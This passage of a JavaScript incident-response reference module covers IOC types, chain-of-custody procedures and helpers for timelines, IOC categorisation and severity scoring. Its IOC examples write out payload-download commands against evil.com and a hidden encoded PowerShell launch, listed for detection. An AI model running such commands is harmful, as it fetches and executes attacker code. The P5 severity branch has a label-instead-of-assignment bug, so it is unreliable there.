    tools: ["sc query", "Get-Service", "Autoruns", "Registry Explorer", "Sysmon Event ID 7045"],
    falsePositives: ["Legitimate services with generic names", "Third-party security software services", "OEM/manufacturer services"],
  },
  {
    type: "scheduled_task_name",
    description: "Scheduled task name created for persistence or execution",
    examples: ["\\Microsoft\\Windows\\UpdateCheck", "\\SystemMaintenance", "\\GoogleUpdateTask"],
    tools: ["schtasks /query", "Get-ScheduledTask", "Autoruns", "Task Scheduler Event Log"],
    falsePositives: ["Legitimate Windows maintenance tasks", "Software update tasks from vendors", "Enterprise management tool tasks"],
  },
  {
    type: "pipe_name",
    description: "Named pipe used for inter-process communication by malware (common in Cobalt Strike)",
    examples: ["\\\\.\\pipe\\msagent_12", "\\\\.\\pipe\\MSSE-1234-server", "\\\\.\\pipe\\postex_ssh_1234"],
    tools: ["PipeList (Sysinternals)", "Process Explorer", "Volatility handles", "Sysmon Event ID 17/18"],
    falsePositives: ["Common system named pipes", "Application-specific pipes from legitimate software", "SQL Server named pipes"],
  },
  {
    type: "command_line",
    description: "Specific command line or command pattern associated with malicious activity",
    examples: ["powershell -nop -w hidden -enc <base64>", "certutil -urlcache -split -f http://evil.com/payload", "bitsadmin /transfer job /download http://evil.com/file"],
    tools: ["Sysmon Event ID 1", "Process Monitor", "EDR command line logging", "Windows Security Event ID 4688"],
    falsePositives: ["System administrators using same tools legitimately", "Automation scripts with similar syntax", "Software installers using silent/hidden flags"],
  },
];

// ---------------------------------------------------------------------------
// 7. CHAIN_OF_CUSTODY
// ---------------------------------------------------------------------------

const CHAIN_OF_CUSTODY = {
  template: {
    caseNumber: "",
    caseTitle: "",
    investigator: "",
    organization: "",
    dateOpened: "",
    classification: "",
    evidenceItems: [
      {
        itemNumber: "",
        description: "",
        type: "physical | digital | network_capture | memory_dump | disk_image | log_file",
        serialNumber: "",
        make: "",
        model: "",
        condition: "",
        dateCollected: "",
        timeCollected: "",
        collectedBy: "",
        location: "",
        hashMD5: "",
        hashSHA1: "",
        hashSHA256: "",
        storageLocation: "",
        notes: "",
      },
    ],
    transferLog: [
      {
        date: "",
        time: "",
        releasedBy: "",
        receivedBy: "",
        purpose: "",
        location: "",
        condition: "",
        signature: "",
      },
    ],
  },

  procedures: {
    collection: [
      "Document the scene with photographs and detailed notes before touching anything",
      "Record the date, time, location, and personnel present",
      "Use write-blockers when connecting storage devices for imaging",
      "Create forensic images using validated tools (FTK Imager, dd, dc3dd)",
      "Calculate and record cryptographic hashes (MD5, SHA-1, SHA-256) of all evidence",
      "Verify image integrity by comparing source and destination hashes",
      "Label all evidence with unique identifiers and case numbers",
      "Place physical evidence in anti-static bags with tamper-evident seals",
      "Document the state of the device (powered on/off, screen contents, running apps)",
      "If device is powered on, capture volatile data (memory, network connections) first",
      "Use sterile (forensically wiped) media for evidence storage",
      "Never work directly on original evidence -- always use forensic copies",
      "Maintain a detailed evidence log from the moment of collection",
    ],

    preservation: [
      "Store evidence in a secure, access-controlled evidence room or safe",
      "Maintain temperature and humidity controls for physical evidence",
      "Use WORM (Write Once Read Many) media for long-term digital evidence storage",
      "Create at least two forensic copies -- one working copy, one archive",
      "Store copies in geographically separate locations when possible",
      "Protect evidence from electromagnetic interference and physical damage",
      "Re-verify cryptographic hashes periodically to ensure integrity",
      "Document all access to evidence with date, time, person, and purpose",
      "Use tamper-evident containers and seals for physical evidence",
      "Implement a sign-in/sign-out log for evidence room access",
      "Maintain backup copies of forensic images on encrypted media",
      "Establish retention periods in accordance with legal and organizational requirements",
    ],

    documentation: [
      "Maintain a detailed chain of custody form for every evidence item",
      "Record every transfer of evidence between personnel with signatures",
      "Document the condition of evidence at each transfer point",
      "Record all analysis actions performed on evidence copies",
      "Use standardized evidence labeling and numbering schemes",
      "Photograph evidence before and after analysis when applicable",
      "Keep contemporaneous notes during analysis (examiner notebook)",
      "Record tool versions and configurations used for analysis",
      "Document any anomalies or unexpected findings during examination",
      "Maintain a case log with all actions, decisions, and timeline",
      "Cross-reference findings with evidence item numbers in reports",
      "Ensure all documentation would withstand legal scrutiny (Daubert standard)",
    ],

    legal_considerations: [
      "Obtain proper legal authorization before collection (warrant, consent, policy)",
      "Understand jurisdictional requirements for evidence handling",
      "Comply with applicable privacy laws (GDPR, CCPA, ECPA) during collection",
      "Document the legal basis for evidence collection and analysis",
      "Maintain attorney-client privilege where applicable",
      "Consider international data transfer restrictions (MLAT requirements)",
      "Preserve evidence in accordance with litigation hold requirements",
      "Ensure chain of custody supports admissibility in court (FRE 901/902)",
      "Consider Fourth Amendment implications for searches (US jurisdiction)",
      "Document consent if obtained in lieu of a warrant",
      "Be prepared to testify about evidence handling procedures",
      "Maintain certifications and training records for forensic examiners",
    ],

    digital_imaging: [
      "Use write-blocking hardware or software before connecting evidence media",
      "Create bit-for-bit forensic images using validated tools",
      "For dd: dd if=/dev/sdX of=evidence.dd bs=64K conv=noerror,sync status=progress",
      "For dc3dd: dc3dd if=/dev/sdX of=evidence.dd hash=sha256 log=imaging.log",
      "For FTK Imager: File -> Create Disk Image -> select Physical Drive",
      "For E01 format: ewfacquire /dev/sdX (Expert Witness Format with compression)",
      "Calculate hash before imaging, after imaging source, and of image file",
      "Document any errors or bad sectors encountered during imaging",
      "Verify the image by mounting read-only and comparing to source hash",
      "Store the forensic image with its hash values and imaging log",
      "For live systems: capture memory first (DumpIt, WinPmem, LiME)",
      "For virtual machines: snapshot or export the VM and its disk files",
      "For cloud instances: create disk snapshots via cloud provider API",
    ],

    volatile_data_collection: [
      "Capture in order of volatility (RFC 3227): registers -> cache -> RAM -> disk",
      "Capture system date/time and timezone (date, time /t)",
      "Capture running processes (ps aux, tasklist /v)",
      "Capture network connections (netstat -anob, ss -tunap)",
      "Capture network configuration (ifconfig, ipconfig /all)",
      "Capture routing table (route print, ip route)",
      "Capture ARP cache (arp -a, ip neigh)",
      "Capture DNS cache (ipconfig /displaydns, resolvectl statistics)",
      "Capture logged-in users (who, query user)",
      "Capture open files (lsof, openfiles /query)",
      "Capture scheduled tasks (schtasks /query /fo LIST, crontab -l)",
      "Capture loaded kernel modules (lsmod, driverquery)",
      "Capture full memory dump (winpmem, LiME, DumpIt, Magnet RAM Capture)",
      "Record all collection commands and their output with timestamps",
    ],
  },
};

// ---------------------------------------------------------------------------
// 8. Helper functions
// ---------------------------------------------------------------------------

/**
 * Create a sorted timeline from an array of event objects.
 * Each event should have at minimum: { timestamp, source, description }
 * Optional fields: { type, severity, actor, target, details }
 *
 * @param {Array} events - Array of event objects
 * @returns {Object} Timeline object with sorted events, summary, and metadata
 */
function createTimeline(events) {
  if (!Array.isArray(events) || events.length === 0) {
    return { events: [], summary: { total: 0, timespan: null, sources: [] }, errors: ["No events provided"] };
  }

  const errors = [];
  const parsed = [];

  for (let i = 0; i < events.length; i++) {
    const evt = events[i];
    if (!evt || typeof evt !== "object") {
      errors.push(`Event at index ${i} is not a valid object`);
      continue;
    }

    const ts = evt.timestamp ? new Date(evt.timestamp) : null;
    if (!ts || isNaN(ts.getTime())) {
      errors.push(`Event at index ${i} has invalid timestamp: ${evt.timestamp}`);
      continue;
    }

    parsed.push({
      timestamp: ts.toISOString(),
      epochMs: ts.getTime(),
      source: evt.source || "unknown",
      description: evt.description || "",
      type: evt.type || "event",
      severity: evt.severity || "info",
      actor: evt.actor || null,
      target: evt.target || null,
      details: evt.details || null,
      originalIndex: i,
    });
  }

  // Sort by timestamp ascending
  parsed.sort((a, b) => a.epochMs - b.epochMs);

  // Compute summary
  const sources = [...new Set(parsed.map((e) => e.source))];
  const severities = {};
  for (const e of parsed) {
    severities[e.severity] = (severities[e.severity] || 0) + 1;
  }

  const timespan =
    parsed.length >= 2
      ? {
          start: parsed[0].timestamp,
          end: parsed[parsed.length - 1].timestamp,
          durationMs: parsed[parsed.length - 1].epochMs - parsed[0].epochMs,
          durationHuman: formatDuration(parsed[parsed.length - 1].epochMs - parsed[0].epochMs),
        }
      : parsed.length === 1
        ? { start: parsed[0].timestamp, end: parsed[0].timestamp, durationMs: 0, durationHuman: "0 seconds" }
        : null;

  // Group events by phase (based on time gaps)
  const phases = [];
  if (parsed.length > 0) {
    let currentPhase = { start: parsed[0].timestamp, events: [parsed[0]] };
    const gapThreshold = 3600000; // 1 hour gap = new phase
    for (let i = 1; i < parsed.length; i++) {
      const gap = parsed[i].epochMs - parsed[i - 1].epochMs;
      if (gap > gapThreshold) {
        currentPhase.end = parsed[i - 1].timestamp;
        currentPhase.eventCount = currentPhase.events.length;
        phases.push(currentPhase);
        currentPhase = { start: parsed[i].timestamp, events: [parsed[i]] };
      } else {
        currentPhase.events.push(parsed[i]);
      }
    }
    currentPhase.end = parsed[parsed.length - 1].timestamp;
    currentPhase.eventCount = currentPhase.events.length;
    phases.push(currentPhase);
  }

  return {
    events: parsed.map((e) => {
      const { epochMs, originalIndex, ...rest } = e;
      return rest;
    }),
    summary: {
      total: parsed.length,
      timespan,
      sources,
      severities,
      phaseCount: phases.length,
    },
    phases: phases.map((p, idx) => ({
      phase: idx + 1,
      start: p.start,
      end: p.end,
      eventCount: p.eventCount,
    })),
    errors: errors.length > 0 ? errors : undefined,
  };
}

/**
 * Format millisecond duration into human-readable string.
 * @param {number} ms
 * @returns {string}
 */
function formatDuration(ms) {
  if (ms < 1000) return `${ms} milliseconds`;
  const seconds = Math.floor(ms / 1000);
  if (seconds < 60) return `${seconds} second${seconds !== 1 ? "s" : ""}`;
  const minutes = Math.floor(seconds / 60);
  if (minutes < 60) {
    const rem = seconds % 60;
    return `${minutes} minute${minutes !== 1 ? "s" : ""}${rem > 0 ? `, ${rem} second${rem !== 1 ? "s" : ""}` : ""}`;
  }
  const hours = Math.floor(minutes / 60);
  const remMin = minutes % 60;
  if (hours < 24) {
    return `${hours} hour${hours !== 1 ? "s" : ""}${remMin > 0 ? `, ${remMin} minute${remMin !== 1 ? "s" : ""}` : ""}`;
  }
  const days = Math.floor(hours / 24);
  const remHr = hours % 24;
  return `${days} day${days !== 1 ? "s" : ""}${remHr > 0 ? `, ${remHr} hour${remHr !== 1 ? "s" : ""}` : ""}`;
}

/**
 * Categorize an Indicator of Compromise value by examining its format.
 *
 * @param {string} value - The IOC value to categorize
 * @returns {Object} { type, confidence, description, recommendations }
 */
function categorizeIOC(value) {
  if (!value || typeof value !== "string") {
    return { type: "unknown", confidence: "none", description: "Invalid or empty value", recommendations: [] };
  }

  const trimmed = value.trim();

  // IPv4 address
  const ipv4Regex = /^(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)$/;
  if (ipv4Regex.test(trimmed)) {
    const parts = trimmed.split(".").map(Number);
    const isPrivate =
      parts[0] === 10 ||
      (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) ||
      (parts[0] === 192 && parts[1] === 168) ||
      parts[0] === 127;
    return {
      type: "ipv4_address",
      confidence: "high",
      description: `IPv4 address${isPrivate ? " (private/internal range)" : " (public/routable)"}`,
      isPrivate,
      recommendations: [
        "Check against threat intelligence feeds (VirusTotal, AbuseIPDB)",
        "Query passive DNS for associated domains",
        "Check geolocation and ASN ownership",
        "Search firewall and proxy logs for connections to this IP",
        isPrivate ? "Investigate as potential lateral movement target" : "Block at perimeter firewall if confirmed malicious",
      ],
    };
  }

  // IPv6 address (simplified check)
  const ipv6Regex = /^(?:[0-9a-fA-F]{1,4}:){2,7}[0-9a-fA-F]{1,4}$|^::(?:[0-9a-fA-F]{1,4}:){0,5}[0-9a-fA-F]{1,4}$|^(?:[0-9a-fA-F]{1,4}:){1,6}:$/;
  if (ipv6Regex.test(trimmed) || trimmed.includes("::")) {
    // More permissive IPv6 check
    const isIPv6 = /^[0-9a-fA-F:]+$/.test(trimmed) && trimmed.includes(":") && trimmed.length >= 3;
    if (isIPv6) {
      return {
        type: "ipv6_address",
        confidence: "medium",
        description: "IPv6 address",
        recommendations: [
          "Check against threat intelligence feeds",
          "Query passive DNS for associated domains",
          "Note: IPv6 IOCs are less commonly tracked -- check with specialized sources",
        ],
      };
    }
  }

  // CIDR notation
  const cidrRegex = /^(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\/(?:3[0-2]|[12]?\d)$/;
  if (cidrRegex.test(trimmed)) {
    return {
      type: "cidr_range",
      confidence: "high",
      description: "CIDR notation IP range",
      recommendations: [
        "Identify the ASN and organization owning this range",
        "Check range reputation on AbuseIPDB and GreyNoise",
        "Evaluate blocking the entire range vs. specific IPs",
        "Search network logs for any connections to/from this range",
      ],
    };
  }

  // SHA-256 hash (64 hex chars)
  if (/^[0-9a-fA-F]{64}$/.test(trimmed)) {
    return {
      type: "file_hash_sha256",
      confidence: "high",
      description: "SHA-256 file hash",
      recommendations: [
        "Search VirusTotal for analysis and detection results",
        "Check MalwareBazaar and Hybrid Analysis for sample availability",
        "Search endpoint logs for this hash",
        "Add to EDR blocklist if confirmed malicious",
        "Submit to sandbox for dynamic analysis if sample is available",
      ],
    };
  }

  // SHA-1 hash (40 hex chars)
  if (/^[0-9a-fA-F]{40}$/.test(trimmed)) {
    return {
      type: "file_hash_sha1",
      confidence: "high",
      description: "SHA-1 file hash",
      recommendations: [
        "Search VirusTotal for analysis results",
        "Cross-reference with SHA-256 hash if available (preferred for IOCs)",
        "Search endpoint and file integrity monitoring logs",
        "Check NSRL for known-good file match",
      ],
    };
  }

  // MD5 hash (32 hex chars)
  if (/^[0-9a-fA-F]{32}$/.test(trimmed)) {
    return {
      type: "file_hash_md5",
      confidence: "high",
      description: "MD5 file hash (consider using SHA-256 for better accuracy)",
      recommendations: [
        "Search VirusTotal for analysis results",
        "Obtain SHA-256 hash for more reliable identification",
        "Note: MD5 is collision-prone -- do not rely solely on MD5 for identification",
        "Search endpoint logs for this hash",
      ],
    };
  }

  // Email address
  const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
  if (emailRegex.test(trimmed)) {
    return {
      type: "email_address",
      confidence: "high",
      description: "Email address",
      recommendations: [
        "Check Have I Been Pwned for breach associations",
        "Search email gateway logs for messages from this address",
        "Investigate the domain registration (WHOIS, creation date)",
        "Block the sender domain if confirmed as phishing source",
        "Check EmailRep.io for reputation scoring",
      ],
    };
  }

  // URL
  const urlRegex = /^https?:\/\/[^\s/$.?#].[^\s]*$/i;
  if (urlRegex.test(trimmed)) {
    return {
      type: "url",
      confidence: "high",
      description: "URL (web address)",
      recommendations: [
        "Submit to URLScan.io for safe analysis (do NOT visit directly)",
        "Check VirusTotal for URL reputation",
        "Check Google Safe Browsing status",
        "Extract and investigate the domain separately",
        "Search proxy and web filter logs for access to this URL",
        "Block the URL at web proxy/firewall if confirmed malicious",
      ],
    };
  }

  // Domain name
  const domainRegex = /^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$/;
  if (domainRegex.test(trimmed)) {
    return {
      type: "domain",
      confidence: "high",
      description: "Domain name",
      recommendations: [
        "Check WHOIS for registration details and creation date",
        "Query passive DNS for historical resolution data",
        "Check VirusTotal for domain reputation",
        "Search DNS logs for queries to this domain",
        "Add to DNS blocklist/sinkhole if confirmed malicious",
        "Check certificate transparency logs for issued certificates",
      ],
    };
  }

  // Bitcoin address (legacy P2PKH, P2SH, or Bech32)
  const btcRegex = /^(1[a-km-zA-HJ-NP-Z1-9]{25,34}|3[a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-zA-HJ-NP-Z0-9]{25,90})$/;
  if (btcRegex.test(trimmed)) {
    return {
      type: "bitcoin_address",
      confidence: "high",
      description: "Bitcoin wallet address",
      recommendations: [
        "Check blockchain explorer for transaction history",
        "Search for association with known ransomware campaigns",
        "Report to law enforcement and IC3",
        "Monitor for incoming transactions (ransom payments)",
        "Use Chainalysis or CipherTrace for attribution",
      ],
    };
  }

  // Windows registry path
  if (/^HK(LM|CU|CR|U|CC)\\/i.test(trimmed)) {
    return {
      type: "registry_key",
      confidence: "high",
      description: "Windows registry path",
      recommendations: [
        "Check if the key exists on potentially compromised systems",
        "Compare against known persistence locations (MITRE ATT&CK T1547)",
        "Examine the key value and data for malicious content",
        "Add to EDR monitoring rules",
        "Check Autoruns output for matching entries",
      ],
    };
  }

  // Windows file path
  if (/^[A-Za-z]:\\/.test(trimmed)) {
    return {
      type: "file_path",
      confidence: "medium",
      description: "Windows file path",
      recommendations: [
        "Search for the file across endpoints using EDR",
        "If file exists, collect and hash it for further analysis",
        "Check if the path is a known malware staging location",
        "Monitor the directory for new file creation",
      ],
    };
  }

  // Unix file path
  if (/^\/[a-zA-Z]/.test(trimmed)) {
    return {
      type: "file_path",
      confidence: "medium",
      description: "Unix/Linux file path",
      recommendations: [
        "Search for the file across systems using osquery or Velociraptor",
        "If file exists, collect and hash it for analysis",
        "Check file permissions and ownership",
        "Review file access logs (auditd) for the path",
      ],
    };
  }

  // Named pipe
  if (/^\\\\.\\pipe\\/i.test(trimmed)) {
    return {
      type: "pipe_name",
      confidence: "high",
      description: "Windows named pipe",
      recommendations: [
        "Check for the pipe on potentially compromised systems (PipeList)",
        "Common in Cobalt Strike -- check for associated indicators",
        "Monitor with Sysmon Event ID 17 (pipe created) and 18 (pipe connected)",
        "Compare against known Cobalt Strike and Metasploit pipe patterns",
      ],
    };
  }

  // User agent string
  if (/^Mozilla\/|^curl\/|^python-|^Go-http|^Java\/|^Wget\//i.test(trimmed)) {
    return {
      type: "user_agent",
      confidence: "medium",
      description: "HTTP User-Agent string",
      recommendations: [
        "Search web proxy and WAF logs for requests with this user agent",
        "Check if the user agent matches known malware or scanning tools",
        "Note: user agents are easily spoofed",
        "Correlate with other IOCs for higher confidence",
      ],
    };
  }

  // CVE identifier
  if (/^CVE-\d{4}-\d{4,}$/i.test(trimmed)) {
    return {
      type: "cve",
      confidence: "high",
      description: "Common Vulnerabilities and Exposures identifier",
      recommendations: [
        "Check NVD (nvd.nist.gov) for vulnerability details and CVSS score",
        "Determine if affected software is present in your environment",
        "Check for available patches and apply immediately if critical",
        "Search for proof-of-concept exploits to assess exploitability",
        "Monitor for exploitation attempts in IDS/IPS logs",
      ],
    };
  }

  // MITRE ATT&CK technique ID
  if (/^T\d{4}(\.\d{3})?$/i.test(trimmed)) {
    return {
      type: "mitre_attack_technique",
      confidence: "high",
      description: "MITRE ATT&CK technique identifier",
      recommendations: [
        "Look up the technique on attack.mitre.org for details",
        "Map detection opportunities to your security controls",
        "Check SIEM rules and EDR detections for this technique",
        "Review associated procedure examples for threat context",
      ],
    };
  }

  // ASN
  if (/^AS\d+$/i.test(trimmed)) {
    return {
      type: "asn",
      confidence: "high",
      description: "Autonomous System Number",
      recommendations: [
        "Look up the ASN on BGPView or Hurricane Electric BGP Toolkit",
        "Identify the organization and country",
        "Check reputation with Team Cymru or Spamhaus ASN blocklist",
        "Determine if blocking the entire ASN is appropriate",
      ],
    };
  }

  // Fallback
  return {
    type: "unknown",
    confidence: "low",
    description: "Could not automatically categorize this IOC value",
    recommendations: [
      "Manually review the value for context",
      "Search threat intelligence platforms with the raw value",
      "Consult with senior analysts for classification",
      "Document the value with associated context for future reference",
    ],
  };
}

/**
 * Determine incident severity based on impact and scope parameters.
 *
 * @param {string} impact - Impact level: "none", "low", "medium", "high", "critical"
 * @param {string} scope - Scope descriptor: "single_user", "department", "multiple_departments", "organization", "external", "supply_chain"
 * @returns {Object} { severity, level, description, sla, escalation, notifications }
 */
function severityFromImpact(impact, scope) {
  const impactLevels = { none: 0, low: 1, medium: 2, high: 3, critical: 4 };
  const scopeLevels = {
    single_user: 1,
    department: 2,
    multiple_departments: 3,
    organization: 4,
    external: 5,
    supply_chain: 5,
  };

  const impactScore = impactLevels[String(impact).toLowerCase()] ?? 1;
  const scopeScore = scopeLevels[String(scope).toLowerCase()] ?? 1;

  // Severity matrix: composite score determines overall severity
  const composite = impactScore * scopeScore;

  let severity, level, description, sla, escalation, notifications;

  if (composite >= 16) {
    severity = "P1";
    level = "critical";
    description = "Critical incident requiring immediate executive-level response. Active threat with organization-wide or external impact.";
    sla = {
      initialResponse: "15 minutes",
      statusUpdate: "Every 30 minutes",
      escalationDeadline: "30 minutes if not contained",
      resolution: "All hands until resolved",
    };
    escalation = [
      "CISO / VP of Security",
      "CTO / CIO",
      "CEO (if data breach or regulatory impact)",
      "Legal counsel",
      "External incident response retainer",
      "Law enforcement (if criminal activity)",
      "Regulatory bodies (per notification requirements)",
      "Board of Directors (if material impact)",
    ];
    notifications = [
      "Incident response team (all members)",
      "Executive leadership team",
      "Legal and compliance",
      "Communications / PR team",
      "Affected business unit leaders",
      "Insurance carrier (if cyber insurance policy active)",
    ];
  } else if (composite >= 9) {
    severity = "P2";
    level = "high";
    description = "High severity incident requiring urgent response. Significant impact to business operations or data security.";
    sla = {
      initialResponse: "30 minutes",
      statusUpdate: "Every 1 hour",
      escalationDeadline: "2 hours if not contained",
      resolution: "Target 24 hours",
    };
    escalation = [
      "Security operations manager",
      "CISO (if escalating)",
      "Affected system owners",
      "External incident response (if needed)",
    ];
    notifications = [
      "Incident response team (on-call + relevant specialists)",
      "Security operations manager",
      "Affected business unit manager",
      "IT operations team",
    ];
  } else if (composite >= 4) {
    severity = "P3";
    level = "medium";
    description = "Medium severity incident requiring prompt response during business hours. Limited impact to operations.";
    sla = {
      initialResponse: "1 hour",
      statusUpdate: "Every 4 hours",
      escalationDeadline: "8 hours if not contained",
      resolution: "Target 72 hours",
    };
    escalation = [
      "SOC team lead",
      "Affected system administrator",
      "Security operations manager (if escalating)",
    ];
    notifications = [
      "SOC team",
      "Affected system owner",
      "IT operations (if system impact)",
    ];
  } else if (composite >= 1) {
    severity = "P4";
    level = "low";
    description = "Low severity incident handled during normal business operations. Minimal impact, single user or system affected.";
    sla = {
      initialResponse: "4 hours",
      statusUpdate: "Daily",
      escalationDeadline: "5 business days if not resolved",
      resolution: "Target 1 week",
    };
    escalation = [
      "SOC analyst (tier 1/2)",
      "SOC team lead (if escalating)",
    ];
    notifications = [
      "SOC team (ticket assignment)",
      "Affected user (acknowledgment)",
    ];
  } else {
    severity = "P5";
    level = "informational";
    description = "Informational event or false positive. No immediate response required.";
    sla = {
      initialResponse: "Next business day",
      statusUpdate: "As needed",
      escalationDeadline: "N/A",
      resolution: "Best effort",
    };
    escalation = ["SOC analyst (tier 1)"];
    notifications: ["SOC team (for tracking)"];
  }

  return {
    severity,
    level,
    description,
    impactScore,
    scopeScore,
    compositeScore: composite,
    sla,
    escalation,
    notifications,
    mitigationPriority: composite >= 16 ? "IMMEDIATE -- drop all other work" : composite >= 9 ? "URGENT -- within current shift" : composite >= 4 ? "HIGH -- within business day" : "NORMAL -- standard queue",
  };
}

// ---------------------------------------------------------------------------
// Exports
// ---------------------------------------------------------------------------

module.exports = {
  IR_PLAYBOOKS,
  FORENSIC_ARTIFACTS,
  MEMORY_ANALYSIS,
  LOG_SOURCES,
  TIMELINE_TOOLS,
  IOC_TYPES,
  CHAIN_OF_CUSTODY,
  createTimeline,
  categorizeIOC,
  severityFromImpact,
};
